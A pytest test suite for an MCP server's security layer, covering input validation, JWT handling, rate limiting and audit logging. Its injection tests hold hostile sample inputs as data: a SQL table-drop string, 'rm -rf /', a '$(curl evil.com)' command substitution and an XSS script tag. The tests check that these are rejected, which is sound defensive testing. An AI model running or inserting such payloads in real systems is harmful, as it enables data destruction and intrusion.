"""
Comprehensive security tests for MCP Server
==========================================

Tests for authentication, authorization, input validation, rate limiting, and audit logging.
"""

import pytest
import asyncio
import jwt
import time
from datetime import datetime, timedelta
from unittest.mock import Mock, AsyncMock, patch
import redis.asyncio as aioredis

from mcp_server.security import (
    SecurityManager, SecurityConfig, AuthManager, RateLimiter, 
    AuditLogger, InputValidator, AuthenticationError, 
    AuthorizationError, RateLimitError, InputValidationError
)
from mcp_server.models import MCPClientInfo, ToolDefinition, ToolParameter, SecurityLevel, ToolCategory


@pytest.fixture
async def redis_client():
    """Mock Redis client for testing"""
    mock_redis = AsyncMock()
    mock_redis.ping.return_value = True
    mock_redis.get.return_value = None
    mock_redis.setex.return_value = True
    mock_redis.incr.return_value = 1
    mock_redis.expire.return_value = True
    mock_redis.exists.return_value = False
    mock_redis.hset.return_value = True
    mock_redis.hgetall.return_value = {}
    mock_redis.keys.return_value = []
    mock_redis.pipeline.return_value = mock_redis
    mock_redis.execute.return_value = [1, True]
    return mock_redis


@pytest.fixture
def security_config():
    """Security configuration for testing"""
    return SecurityConfig(
        jwt_secret="test_jwt_secret_key_for_testing_purposes_32_chars",
        jwt_algorithm="HS256",
        jwt_expiry_hours=24,
        rate_limit_requests=100,
        rate_limit_window=60,
        max_request_size=1000000,
        allowed_networks=["127.0.0.1/32", "192.168.1.0/24"],
        encryption_key="test_encryption_key_32_characters",
        password_min_length=8,
        session_timeout=3600,
        audit_log_retention_days=30
    )


@pytest.fixture
def client_info():
    """Sample client info for testing"""
    return MCPClientInfo(
        name="TestClient",
        version="1.0.0",
        client_id="test_client_123"
    )


class TestInputValidator:
    """Test input validation and sanitization"""
    
    def test_validate_email(self):
        validator = InputValidator()
        
        # Valid emails
        assert validator.validate_email("test@example.com")
        assert validator.validate_email("user.name+tag@domain.co.uk")
        
        # Invalid emails
        assert not validator.validate_email("invalid.email")
        assert not validator.validate_email("@domain.com")
        assert not validator.validate_email("user@")
        assert not validator.validate_email("")
    
    def test_validate_domain(self):
        validator = InputValidator()
        
        # Valid domains
        assert validator.validate_domain("example.com")
        assert validator.validate_domain("sub.domain.org")
        assert validator.validate_domain("test-site.co.uk")
        
        # Invalid domains
        assert not validator.validate_domain("invalid..domain")
        assert not validator.validate_domain("-invalid.com")
        assert not validator.validate_domain("toolong" + "a" * 250 + ".com")
    
    def test_validate_ip(self):
        validator = InputValidator()
        
        # Valid IPs
        assert validator.validate_ip("192.168.1.1")
        assert validator.validate_ip("10.0.0.1")
        assert validator.validate_ip("2001:db8::1")
        
        # Invalid IPs
        assert not validator.validate_ip("256.1.1.1")
        assert not validator.validate_ip("192.168.1")
        assert not validator.validate_ip("not.an.ip")
    
    def test_validate_hash(self):
        validator = InputValidator()
        
        # Valid hashes
        assert validator.validate_hash("abc123def456", "md5") == False  # Wrong length
        assert validator.validate_hash("d41d8cd98f00b204e9800998ecf8427e", "md5")
        assert validator.validate_hash("da39a3ee5e6b4b0d3255bfef95601890afd80709", "sha1")
        
        # Invalid hashes
        assert not validator.validate_hash("not_hex_chars_zxyz")
        assert not validator.validate_hash("")
    
    def test_sanitize_input(self):
        validator = InputValidator()
        
        # Basic sanitization
        result = validator.sanitize_input("normal text")
        assert result == "normal text"
        
        # Remove null bytes and control characters
        result = validator.sanitize_input("text\x00with\x01bad\x02chars")
        assert "\x00" not in result
        assert "\x01" not in result
        assert "\x02" not in result
        
        # Truncate long input
        long_text = "a" * 2000
        result = validator.sanitize_input(long_text, max_length=100)
        assert len(result) == 100
    
    def test_check_injection_patterns(self):
        validator = InputValidator()
        
        # SQL injection patterns
        threats = validator.check_injection_patterns("'; DROP TABLE users; --")
        assert "sql_injection" in threats
        
        threats = validator.check_injection_patterns("1 OR 1=1")
        assert "sql_injection" in threats
        
        # Command injection patterns
        threats = validator.check_injection_patterns("test; rm -rf /")
        assert "command_injection" in threats
        
        threats = validator.check_injection_patterns("$(curl evil.com)")
        assert "command_injection" in threats
        
        # XSS patterns
        threats = validator.check_injection_patterns("<script>alert('xss')</script>")
        assert "xss" in threats
        
        # Clean input
        threats = validator.check_injection_patterns("normal search query")
        assert len(threats) == 0
    
    def test_validate_tool_parameters(self):
        validator = InputValidator()
        
        # Create a sample tool definition
        tool_def = ToolDefinition(
            name="test_tool",
            description="Test tool",
            category=ToolCategory.COLLECTION,
            security_level=SecurityLevel.MEDIUM,
            parameters=[
                ToolParameter(
                    name="required_param",
                    type="string",
                    description="Required parameter",
                    required=True,
                    max_length=100
                ),
                ToolParameter(
                    name="optional_param",
                    type="integer",
                    description="Optional parameter",
                    required=False,
                    default=42
                ),
                ToolParameter(
                    name="enum_param",
                    type="string",
                    description="Enum parameter",
                    required=False,
                    enum_values=["option1", "option2", "option3"]
                )
            ]
        )
        
        # Valid parameters
        params = {
            "required_param": "valid value",
            "optional_param": 123,
            "enum_param": "option2"
        }
        
        result = validator.validate_tool_parameters(tool_def, params)
        assert result["required_param"] == "valid value"
        assert result["optional_param"] == 123
        assert result["enum_param"] == "option2"
        
        # Missing required parameter
        with pytest.raises(InputValidationError):
            validator.validate_tool_parameters(tool_def, {"optional_param": 123})
        
        # Invalid enum value
        with pytest.raises(InputValidationError):
            validator.validate_tool_parameters(tool_def, {
                "required_param": "valid",
                "enum_param": "invalid_option"
            })
        
        # Input too long
        with pytest.raises(InputValidationError):
            validator.validate_tool_parameters(tool_def, {
                "required_param": "a" * 200  # Exceeds max_length of 100
            })
        
        # Injection attempt
        with pytest.raises(InputValidationError):
            validator.validate_tool_parameters(tool_def, {
                "required_param": "'; DROP TABLE users; --"
            })


class TestAuthManager:
    """Test authentication and authorization"""
    
    @pytest.mark.asyncio
    async def test_generate_jwt(self, security_config, redis_client, client_info):
        auth_manager = AuthManager(security_config, redis_client)
        
        token = auth_manager.generate_jwt(client_info, "test_user")
        
        # Verify token can be decoded
        payload = jwt.decode(token, security_config.jwt_secret, algorithms=[security_config.jwt_algorithm])
        assert payload["client_id"] == client_info.client_id
        assert payload["client_name"] == client_info.name
        assert payload["user_id"] == "test_user"
    
    @pytest.mark.asyncio
    async def test_validate_jwt(self, security_config, redis_client, client_info):
        auth_manager = AuthManager(security_config, redis_client)
        
        # Generate a valid token
        token = auth_manager.generate_jwt(client_info)
        
        # Validate the token
        payload = await auth_manager.validate_jwt(token)
        assert payload["client_id"] == client_info.client_id
    
    @pytest.mark.asyncio
    async def test_validate_expired_jwt(self, security_config, redis_client, client_info):
        # Create config with very short expiry
        short_config = SecurityConfig(
            jwt_secret=security_config.jwt_secret,
            jwt_expiry_hours=0  # Immediate expiry
        )
        auth_manager = AuthManager(short_config, redis_client)
        
        # Generate token that expires immediately
        token = jwt.encode({
            'client_id': client_info.client_id,
            'exp': datetime.utcnow() - timedelta(seconds=1)  # Already expired
        }, short_config.jwt_secret, algorithm='HS256')
        
        # Should raise AuthenticationError
        with pytest.raises(AuthenticationError):
            await auth_manager.validate_jwt(token)
    
    @pytest.mark.asyncio
    async def test_revoke_token(self, security_config, redis_client, client_info):
        auth_manager = AuthManager(security_config, redis_client)
        
        token = auth_manager.generate_jwt(client_info)
        
        # Revoke the token
        await auth_manager.revoke_token(token)
        
        # Verify token is blacklisted
        redis_client.exists.return_value = True  # Simulate blacklisted token
        with pytest.raises(AuthenticationError):
            await auth_manager.validate_jwt(token)
    
    def test_hash_password(self, security_config, redis_client):
        auth_manager = AuthManager(security_config, redis_client)
        
        password = "test_password_123"
        hashed = auth_manager.hash_password(password)
        
        # Verify it's properly formatted (salt:hash)
        assert ":" in hashed
        salt, hash_part = hashed.split(":", 1)
        assert len(salt) == 64  # 32 bytes hex encoded
        assert len(hash_part) == 64  # 32 bytes hex encoded
    
    def test_verify_password(self, security_config, redis_client):
        auth_manager = AuthManager(security_config, redis_client)
        
        password = "test_password_123"
        hashed = auth_manager.hash_password(password)
        
        # Correct password should verify
        assert auth_manager.verify_password(password, hashed)
        
        # Wrong password should not verify
        assert not auth_manager.verify_password("wrong_password", hashed)
    
    def test_check_network_access(self, security_config, redis_client):
        auth_manager = AuthManager(security_config, redis_client)
        
        # Allowed networks: 127.0.0.1/32, 192.168.1.0/24
        assert auth_manager.check_network_access("127.0.0.1")
        assert auth_manager.check_network_access("192.168.1.100")
        
        # Denied networks
        assert not auth_manager.check_network_access("10.0.0.1")
        assert not auth_manager.check_network_access("172.16.0.1")


class TestRateLimiter:
    """Test rate limiting functionality"""
    
    @pytest.mark.asyncio
    async def test_rate_limit_within_limits(self, security_config, redis_client):
        rate_limiter = RateLimiter(redis_client, security_config)
        
        # First request should be allowed
        rate_info = await rate_limiter.check_rate_limit("test_client", "test_tool")
        assert rate_info.requests_made == 1
        assert rate_info.requests_remaining == 99  # 100 - 1
    
    @pytest.mark.asyncio
    async def test_rate_limit_exceeded(self, security_config, redis_client):
        rate_limiter = RateLimiter(redis_client, security_config)
        
        # Simulate rate limit exceeded
        redis_client.get.return_value = "100"  # Already at limit
        
        with pytest.raises(RateLimitError):
            await rate_limiter.check_rate_limit("test_client", "test_tool")
    
    @pytest.mark.asyncio
    async def test_rate_limit_reset(self, security_config, redis_client):
        rate_limiter = RateLimiter(redis_client, security_config)
        
        # Simulate requests in new time window
        redis_client.get.return_value = None  # No previous requests
        
        rate_info = await rate_limiter.check_rate_limit("test_client", "test_tool")
        assert rate_info.requests_made == 1
        assert rate_info.requests_remaining == 99


class TestAuditLogger:
    """Test audit logging functionality"""
    
    @pytest.mark.asyncio
    async def test_log_action(self, security_config, redis_client):
        audit_logger = AuditLogger(redis_client, security_config)
        
        from mcp_server.models import AuditLogEntry
        
        log_entry = AuditLogEntry(
            client_id="test_client",
            action="test_action",
            resource="test_resource",
            success=True,
            ip_address="127.0.0.1",
            user_agent="test_agent"
        )
        
        await audit_logger.log_action(log_entry)
        
        # Verify Redis was called to store the log
        redis_client.hset.assert_called()
        redis_client.expire.assert_called()


class TestSecurityManager:
    """Test main security manager"""
    
    @pytest.fixture
    async def security_manager(self, security_config, redis_client):
        return SecurityManager(security_config, redis_client)
    
    @pytest.mark.asyncio
    async def test_authenticate_request(self, security_manager, client_info):
        # Mock successful authentication
        with patch.object(security_manager.auth_manager, 'validate_jwt', 
                         return_value={"client_id": "test_client", "client_name": "TestClient"}):
            
            payload = await security_manager.authenticate_request(
                token="valid_token",
                client_ip="127.0.0.1",
                user_agent="test_agent"
            )
            
            assert payload["client_id"] == "test_client"
    
    @pytest.mark.asyncio
    async def test_authenticate_request_invalid_network(self, security_manager):
        # Should fail for disallowed network
        with pytest.raises(AuthorizationError):
            await security_manager.authenticate_request(
                token="valid_token",
                client_ip="10.0.0.1",  # Not in allowed networks
                user_agent="test_agent"
            )
    
    @pytest.mark.asyncio
    async def test_authorize_tool_access(self, security_manager):
        # Mock rate limiter to not raise exception
        with patch.object(security_manager.rate_limiter, 'check_rate_limit', return_value=None):
            
            authorized = await security_manager.authorize_tool_access(
                client_id="test_client",
                tool_name="test_tool",
                security_level=SecurityLevel.MEDIUM
            )
            
            assert authorized is True
    
    @pytest.mark.asyncio
    async def test_validate_and_sanitize_params(self, security_manager):
        tool_def = ToolDefinition(
            name="test_tool",
            description="Test tool",
            category=ToolCategory.COLLECTION,
            security_level=SecurityLevel.MEDIUM,
            parameters=[
                ToolParameter(
                    name="test_param",
                    type="string",
                    description="Test parameter",
                    required=True
                )
            ]
        )
        
        params = {"test_param": "valid value"}
        
        result = await security_manager.validate_and_sanitize_params(tool_def, params)
        assert result["test_param"] == "valid value"
    
    @pytest.mark.asyncio
    async def test_log_request(self, security_manager):
        # Mock audit logger
        with patch.object(security_manager.audit_logger, 'log_action') as mock_log:
            
            await security_manager.log_request(
                client_id="test_client",
                action="test_action",
                resource="test_resource",
                ip_address="127.0.0.1",
                user_agent="test_agent",
                success=True,
                request_data={},
                response_data={}
            )
            
            mock_log.assert_called_once()
    
    @pytest.mark.asyncio
    async def test_cleanup_expired_sessions(self, security_manager):
        # Add some test sessions
        security_manager.active_sessions["old_session"] = datetime.now() - timedelta(hours=2)
        security_manager.active_sessions["new_session"] = datetime.now()
        
        await security_manager.cleanup_expired_sessions()
        
        # Old session should be removed
        assert "old_session" not in security_manager.active_sessions
        assert "new_session" in security_manager.active_sessions


class TestSecurityIntegration:
    """Integration tests for security components"""
    
    @pytest.mark.asyncio
    async def test_full_authentication_flow(self, security_config, redis_client):
        security_manager = SecurityManager(security_config, redis_client)
        client_info = MCPClientInfo(name="TestClient", version="1.0.0")
        
        # Generate token
        token = security_manager.auth_manager.generate_jwt(client_info)
        
        # Authenticate request
        payload = await security_manager.authenticate_request(
            token=token,
            client_ip="127.0.0.1",
            user_agent="test_agent"
        )
        
        assert payload["client_id"] == client_info.client_id
    
    @pytest.mark.asyncio
    async def test_tool_execution_security_flow(self, security_config, redis_client):
        security_manager = SecurityManager(security_config, redis_client)
        
        tool_def = ToolDefinition(
            name="test_tool",
            description="Test tool",
            category=ToolCategory.COLLECTION,
            security_level=SecurityLevel.MEDIUM,
            parameters=[
                ToolParameter(
                    name="target_value",
                    type="string",
                    description="Target to analyze",
                    required=True
                )
            ]
        )
        
        # Mock rate limiter
        with patch.object(security_manager.rate_limiter, 'check_rate_limit'):
            
            # Test authorization
            authorized = await security_manager.authorize_tool_access(
                client_id="test_client",
                tool_name="test_tool",
                security_level=SecurityLevel.MEDIUM
            )
            assert authorized
            
            # Test parameter validation
            params = {"target_value": "example.com"}
            validated = await security_manager.validate_and_sanitize_params(tool_def, params)
            assert validated["target_value"] == "example.com"
    
    @pytest.mark.asyncio
    async def test_security_attack_prevention(self, security_config, redis_client):
        security_manager = SecurityManager(security_config, redis_client)
        
        tool_def = ToolDefinition(
            name="test_tool",
            description="Test tool",
            category=ToolCategory.COLLECTION,
            security_level=SecurityLevel.MEDIUM,
            parameters=[
                ToolParameter(
                    name="query",
                    type="string",
                    description="Search query",
                    required=True,
                    max_length=100
                )
            ]
        )
        
        # Test SQL injection prevention
        with pytest.raises(InputValidationError):
            await security_manager.validate_and_sanitize_params(tool_def, {
                "query": "'; DROP TABLE users; --"
            })
        
        # Test command injection prevention
        with pytest.raises(InputValidationError):
            await security_manager.validate_and_sanitize_params(tool_def, {
                "query": "test; rm -rf /"
            })
        
        # Test XSS prevention
        with pytest.raises(InputValidationError):
            await security_manager.validate_and_sanitize_params(tool_def, {
                "query": "<script>alert('xss')</script>"
            })


if __name__ == "__main__":
    pytest.main([__file__])